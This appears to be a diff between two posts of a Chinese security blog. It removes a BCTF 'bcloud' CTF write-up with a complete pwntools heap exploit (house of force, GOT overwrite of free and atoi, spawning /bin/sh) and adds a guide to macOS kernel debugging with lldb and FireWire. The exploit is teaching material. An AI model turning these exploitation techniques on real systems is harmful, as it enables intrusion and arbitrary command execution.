@@ -3,27 +3,20 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>BCTF--cloud | o0xmuhe&#39;s blog</title>
+  <title>Debug macOS Kernel | o0xmuhe&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00: 简介最近在复现一些优质CTF里的题目，所以这个系列的文章会有点多…先做了下BCTF的热身题目–bcloud，一个堆上的利用。  测试环境:ubuntu 16.04 x64">
-<meta name="keywords" content="ctf writeup">
+  <meta name="description" content="0x00 : 环境配置基本分为两种情况，虚拟机调试或者双机调试。 虚拟机 ： vmfusion,` KDK 双机: 火线。 我这里用的是`mbp2017调mbp2015，借了同事的线，连接为：mbp2017-typec-雷电2-火线-雷电2-mbp2015。">
+<meta name="keywords" content="macOS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BCTF--cloud">
-<meta property="og:url" content="http://o0xmuhe.me/2016/09/27/BCTF-cloud/index.html">
+<meta property="og:title" content="Debug macOS Kernel">
+<meta property="og:url" content="http://o0xmuhe.me/2019/10/17/Debug-macOS-Kernel/index.html">
 <meta property="og:site_name" content="o0xmuhe&#39;s blog">
-<meta property="og:description" content="0x00: 简介最近在复现一些优质CTF里的题目，所以这个系列的文章会有点多…先做了下BCTF的热身题目–bcloud，一个堆上的利用。  测试环境:ubuntu 16.04 x64">
+<meta property="og:description" content="0x00 : 环境配置基本分为两种情况，虚拟机调试或者双机调试。 虚拟机 ： vmfusion,` KDK 双机: 火线。 我这里用的是`mbp2017调mbp2015，借了同事的线，连接为：mbp2017-typec-雷电2-火线-雷电2-mbp2015。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/ida_view.jpg">
-<meta property="og:image" content="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/checksec.jpg">
-<meta property="og:image" content="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/show_note.jpg">
-<meta property="og:image" content="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/heap_addr_leak.jpg">
-<meta property="og:image" content="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/hof.jpg">
-<meta property="og:image" content="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/getshell.jpg">
-<meta property="og:updated_time" content="2016-10-06T08:11:46.000Z">
+<meta property="og:updated_time" content="2019-10-17T08:52:32.513Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="BCTF--cloud">
-<meta name="twitter:description" content="0x00: 简介最近在复现一些优质CTF里的题目，所以这个系列的文章会有点多…先做了下BCTF的热身题目–bcloud，一个堆上的利用。  测试环境:ubuntu 16.04 x64">
-<meta name="twitter:image" content="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/ida_view.jpg">
+<meta name="twitter:title" content="Debug macOS Kernel">
+<meta name="twitter:description" content="0x00 : 环境配置基本分为两种情况，虚拟机调试或者双机调试。 虚拟机 ： vmfusion,` KDK 双机: 火线。 我这里用的是`mbp2017调mbp2015，借了同事的线，连接为：mbp2017-typec-雷电2-火线-雷电2-mbp2015。">
   
     <link rel="alternative" href="/atom.xml" title="o0xmuhe&#39;s blog" type="application/atom+xml">
   
@@ -297,11 +290,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-BCTF-cloud" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Debug-macOS-Kernel" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/09/27/BCTF-cloud/" class="article-date">
-      <time datetime="2016-09-27T08:06:45.000Z" itemprop="datePublished">2016-09-27</time>
+      <a href="/2019/10/17/Debug-macOS-Kernel/" class="article-date">
+      <time datetime="2019-10-17T08:30:05.000Z" itemprop="datePublished">2019-10-17</time>
 </a>
     </div>
   
@@ -314,7 +307,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      BCTF--cloud
+      Debug macOS Kernel
     </h1>
   
 
@@ -325,7 +318,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-writeup/">ctf writeup</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/macOS/">macOS</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -335,29 +328,75 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h4 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00: 简介"></a>0x00: 简介</h4><p>最近在复现一些优质CTF里的题目，所以这个系列的文章会有点多…先做了下BCTF的热身题目–bcloud，一个堆上的利用。</p>
-<ul>
-<li>测试环境:ubuntu 16.04 x64</li>
-</ul>
+        <h2 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 : 环境配置"></a>0x00 : 环境配置</h2><p>基本分为两种情况，虚拟机调试或者双机调试。</p>
+<p>虚拟机 ： <code>vmfusion</code>,<code>` KDK</code></p>
+<p>双机: 火线。 我这里用的是<code>`mbp2017</code>调<code>mbp2015</code>，借了同事的线，连接为：<code>mbp2017-typec-雷电2-火线-雷电2-mbp2015</code>。</p>
 <a id="more"></a>
-<h4 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01:程序分析"></a>0x01:程序分析</h4><p>程序是个菜单式的程序，看了下功能，应该就是堆上的一些利用了。<br><img src="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/ida_view.jpg" alt=""><br>看下开启了什么保护。<br><img src="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/checksec.jpg" alt=""></p>
-<p>基本信息就是上面说的那样，下面是具体的分析：</p>
-<ul>
-<li>功能：每个笔记(chunk)的大小、内容、状态以数组形式存储在.bss段</li>
-<li>问题：ban掉了show的操作，需要自己去构造下泄露了。<br><img src="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/show_note.jpg" alt=""></li>
-</ul>
-<p>先开始看在进入菜单之前的函数:<br><img src="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/heap_addr_leak.jpg" alt=""><br>这个函数读入用户名，没看到明显的溢出点，但是问题在于 unsafe_read() 函数，如果输入长度为0x40，那么就可以引发一个堆地址泄露，即在输出用户名的时候，输出一个堆地址。<br>    地址泄露 get!<br><img src="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/hof.jpg" alt=""><br>下面是这个函数，读取host 和 org然后malloc分配空间，之后拷贝过去，由于使用的还是unsafe_read(),所以可以构造一个hof，这种利用需要堆地址，正好，之前有个泄露，这下就满足条件了。</p>
-<h4 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02:利用思路"></a>0x02:利用思路</h4><p>那么既然确定了是hof利用，利用的思路就出来了：</p>
-<p>利用hof的思路，去分配到.bss上的 0x0804b0a0 地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chunk_length[]   ----&gt; 0x0804b0a0</span><br><span class="line">...</span><br><span class="line">chunk_status[]</span><br><span class="line">...</span><br><span class="line">chunk_list[]     ----&gt; 0x0804B120</span><br></pre></td></tr></table></figure></p>
-<p>分配到之后，利用edit功能去填入要改写的函数got，先构造一次泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_list[]中放：atoi@got,free@got,atoi@got</span><br></pre></td></tr></table></figure></p>
-<p>然后修改free@got为printf函数地址，利用delete功能去泄露atoi地址。</p>
-<ol>
-<li>得到atoi()地址之后，利用libc.so确定system()和atoi()的偏移。</li>
-<li>修改atoi()地址为system()，之后随便用下菜单的功能，发送一个/bin/sh\0过去就getshell了。</li>
+<h2 id="0x01-虚拟机"><a href="#0x01-虚拟机" class="headerlink" title="0x01 : 虚拟机"></a>0x01 : 虚拟机</h2><p>下面是标准步骤</p>
+<h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><ol>
+<li><p>关闭SIP，并且把想要加载的内核拷贝到 内核的目录</p>
+<p><code>sudo cp /Library/Developer/KDKs/KDK_YOUR_VERSION/System/Library/Kernels/kernel.development /System/Library/Kernels</code></p>
+</li>
 </ol>
-<h4 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03:exploit"></a>0x03:exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># by muhe</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">name_addr = <span class="number">0x0804B0CC</span></span><br><span class="line">bss_addr  = <span class="number">0x0804b0a0</span></span><br><span class="line">atoi = <span class="number">0x0804b03c</span></span><br><span class="line">free = <span class="number">0x0804b014</span></span><br><span class="line">printf_plt = <span class="number">0x080484D0</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">chunk_length[]   ----&gt; 0x0804b0a0</span></span><br><span class="line"><span class="string">chunk_status[]</span></span><br><span class="line"><span class="string">chunk_list[]     ----&gt; 0x0804B120</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">target = <span class="string">"./bcloud"</span></span><br><span class="line"><span class="comment">#target = ('127.0.0.1',10001)</span></span><br><span class="line">p = process(target)</span><br><span class="line"><span class="comment">#p = context(target)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_note</span><span class="params">(p,length,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span><span class="params">(p,index,new_content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(new_content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(p,index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># leak heap address</span></span><br><span class="line">    name = <span class="string">"A"</span>*<span class="number">60</span>+<span class="string">"BBBB"</span></span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'BBBB'</span>)</span><br><span class="line">    leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">print</span> hex(leak)</span><br><span class="line">    <span class="comment"># hof here</span></span><br><span class="line">    usr_host = <span class="string">"B"</span>*<span class="number">0x40</span></span><br><span class="line">    fuck_top_chunk = <span class="string">"\xff\xff\xff\xff"</span></span><br><span class="line">    p.send(usr_host)</span><br><span class="line">    p.sendline(fuck_top_chunk)</span><br><span class="line">    <span class="comment"># get list_length chunk..</span></span><br><span class="line">    size = (bss_addr<span class="number">-0x8</span>)-leak<span class="number">-0x8</span> - <span class="number">208</span></span><br><span class="line">    new_note(p,size,<span class="string">'AAAA'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'172'</span>)</span><br><span class="line">    <span class="comment">#fill the list_length[] &amp;&amp; list_content[]</span></span><br><span class="line">    payload = p32(<span class="number">4</span>)</span><br><span class="line">    payload += p32(<span class="number">4</span>)</span><br><span class="line">    payload += p32(<span class="number">4</span>)</span><br><span class="line">    payload += p32(<span class="number">0</span>) * <span class="number">29</span></span><br><span class="line">    payload += p32(atoi)</span><br><span class="line">    payload += p32(free)</span><br><span class="line">    payload += p32(atoi)</span><br><span class="line">    payload += p32(<span class="number">0</span>) * <span class="number">8</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment"># change free() to printf()</span></span><br><span class="line">    raw_input(<span class="string">'$debug...'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.send(p32(printf_plt))</span><br><span class="line">    <span class="comment"># leak addr of atoi()</span></span><br><span class="line">    delete_note(p,<span class="number">0</span>)</span><br><span class="line">    garbage = p.recvuntil(<span class="string">"Input the id:\n"</span>)</span><br><span class="line">    leak_atoi = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"got atoi() ----&gt;"</span>+hex(leak_atoi)</span><br><span class="line">    <span class="comment"># get system() addr</span></span><br><span class="line">    system_addr = leak_atoi + <span class="number">0xd8f0</span></span><br><span class="line">    <span class="comment"># overwrite atoi() to system() &amp;&amp; getshell</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.send(p32(system_addr))</span><br><span class="line">    garbage = p.recv()</span><br><span class="line">    p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>getshell~~<br><img src="http://blogimg-10065924.cos.myqcloud.com/bcloud_wp/getshell.jpg" alt=""></p>
-<p>0x04:参考<br><a href="http://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html" target="_blank" rel="noopener">uaf.io</a></p>
+<ol>
+<li><p>安装当前版本系统的KDK，<a href="[https://developer.apple.com/download/more/?q=Kernel%20Debug%20Kit](https://developer.apple.com/download/more/?q=Kernel Debug Kit">Apple Develop KDK download</a>)</p>
+</li>
+<li><p>设置启动参数</p>
+<p><code>sudo nvram boot-args=&quot;debug=0x14e kext-dev-mode=1 kcsuffix=development pmuflags=1 -v&quot;</code></p>
+</li>
+<li><p>清理缓存</p>
+<p><code>sudo kextcache -invalidate /</code></p>
+</li>
+<li><p>记住当前vm的ip，然后重启</p>
+<p><code>sudo reboot</code></p>
+</li>
+</ol>
+<p>这里把<code>development</code>版本的内核拷贝到<code>System/Library/Kernels</code>里，指定启动时加载<code>development</code>版本的内核，当然也可以加载<code>kasan</code>版本的，看需求。</p>
+<h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><ol>
+<li>安装被调试机器的KDK</li>
+</ol>
+<p>这种情况是靠网络调试。</p>
+<p>但是根据之前的启动参数，开机时断不下来的，当然可以设置一个0x1来让他启动时断下来等调试器，但是经过测试，这个不好使(可能我环境有问题)。</p>
+<p>如果按照上面的设置<code>0x14e</code> ，那么需要在虚拟机中按下 <code>cmd + opt + ctrl + shitf+ esc</code>触发中断，</p>
+<p>随后lldb中 : </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">(lldb)kdp-remote you_vm_ip</span><br></pre></td></tr></table></figure>
+<p>之后就可以调试了。</p>
+<h2 id="0x02-双机调试"><a href="#0x02-双机调试" class="headerlink" title="0x02 : 双机调试"></a>0x02 : 双机调试</h2><p>下面是标准步骤</p>
+<h3 id="被调试机"><a href="#被调试机" class="headerlink" title="被调试机"></a>被调试机</h3><ol>
+<li><p>关SIP，拷贝KDK里的内核到<code>/System/Library/Kernels</code></p>
+</li>
+<li><p>安装当前系统版本的KDK</p>
+</li>
+<li><p>设置启动参数</p>
+<p><code>sudo nvram boot-args=&quot;debug=0x14e kdp_match_name=firewire fwkdp=0x8000 kcsuffix=development&quot;</code></p>
+</li>
+<li><p>清理缓存</p>
+<p><code>sudo kextcache -invalidate /</code></p>
+</li>
+<li><p>重启</p>
+<p><code>sudo reboot</code></p>
+</li>
+</ol>
+<p>这里必须说一下，火线的名称，<code>ifconfig</code>里看到的，默认是<code>fw0</code>，但是这个启动参数里必须是<code>firewire</code>，</p>
+<p>必须是<code>firewire</code>，必须是<code>firewire</code>！</p>
+<p>这个地方坑了我挺久，我一直以为用<code>ifconfig</code>里看到的那个名字  :-(</p>
+<h3 id="调试机"><a href="#调试机" class="headerlink" title="调试机"></a>调试机</h3><ol>
+<li><p>安装被调试机器的KDK</p>
+</li>
+<li><p>LLDB加载目标内核</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>启动fwkdp</p>
+<p><code>fwkdp -v</code></p>
+</li>
+<li><p>被调试机按下<code>cmd+opt+ctrl+shift+esc</code>触发中断</p>
+</li>
+<li><p>lldb 里连接</p>
+<p><code>(lldb) kdp-remote localhost</code></p>
+</li>
+</ol>
+<p>感觉过程就是<code>fwkdp</code>做了转发的工作，所以lldb直接<code>kdp-remote</code>就可以了。</p>
+<h2 id="0x03-KDK是必须的吗？"><a href="#0x03-KDK是必须的吗？" class="headerlink" title="0x03 : KDK是必须的吗？"></a>0x03 : KDK是必须的吗？</h2><p>并不是，kdk只是给你更多的内核中的符号，所以不用kdk也没事，就等于直接调试正式版的内核，少了内核符号而已，人肉对比着近期版本的源码其实影响没那么大。</p>
 
       
     </div>
@@ -366,13 +405,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/09/27/BCTF-cloud/">BCTF--cloud</a></p>
+        <p><span>本文标题:</span><a href="/2019/10/17/Debug-macOS-Kernel/">Debug macOS Kernel</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 muhe 的个人博客">muhe</a></p>
-        <p><span>发布时间:</span>2016年09月27日 - 16时06分</p>
-        <p><span>最后更新:</span>2016年10月06日 - 16时11分</p>
+        <p><span>发布时间:</span>2019年10月17日 - 16时30分</p>
+        <p><span>最后更新:</span>2019年10月17日 - 16时52分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/09/27/BCTF-cloud/" title="BCTF--cloud">http://o0xmuhe.me/2016/09/27/BCTF-cloud/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2016/09/27/BCTF-cloud/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/10/17/Debug-macOS-Kernel/" title="Debug macOS Kernel">http://o0xmuhe.me/2019/10/17/Debug-macOS-Kernel/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2019/10/17/Debug-macOS-Kernel/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -385,18 +424,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2016/10/11/HITCON-2016-Quals-SecretHolder/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          HITCON-2016-Quals-SecretHolder
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/09/24/一些环境配置遇到的坑-持续更新/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">一些环境配置遇到的坑(持续更新)</div>
+    <a href="/2019/09/26/Snell-auto-install-cript/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Snell auto install cript</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -407,7 +437,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.</span> <span class="toc-text">0x00: 简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-程序分析"><span class="toc-number">2.</span> <span class="toc-text">0x01:程序分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-利用思路"><span class="toc-number">3.</span> <span class="toc-text">0x02:利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-exploit"><span class="toc-number">4.</span> <span class="toc-text">0x03:exploit</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-环境配置"><span class="toc-number">1.</span> <span class="toc-text">0x00 : 环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-虚拟机"><span class="toc-number">2.</span> <span class="toc-text">0x01 : 虚拟机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vm"><span class="toc-number">2.1.</span> <span class="toc-text">vm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#host"><span class="toc-number">2.2.</span> <span class="toc-text">host</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-双机调试"><span class="toc-number">3.</span> <span class="toc-text">0x02 : 双机调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#被调试机"><span class="toc-number">3.1.</span> <span class="toc-text">被调试机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试机"><span class="toc-number">3.2.</span> <span class="toc-text">调试机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-KDK是必须的吗？"><span class="toc-number">4.</span> <span class="toc-text">0x03 : KDK是必须的吗？</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
 
@@ -474,13 +504,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/10/11/HITCON-2016-Quals-SecretHolder/" title="上一篇: HITCON-2016-Quals-SecretHolder">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2016/09/24/一些环境配置遇到的坑-持续更新/" title="下一篇: 一些环境配置遇到的坑(持续更新)">
+            <a href="/2019/09/26/Snell-auto-install-cript/" title="下一篇: Snell auto install cript">
                 <i class="fa fa-angle-right"></i>
             </a>
         
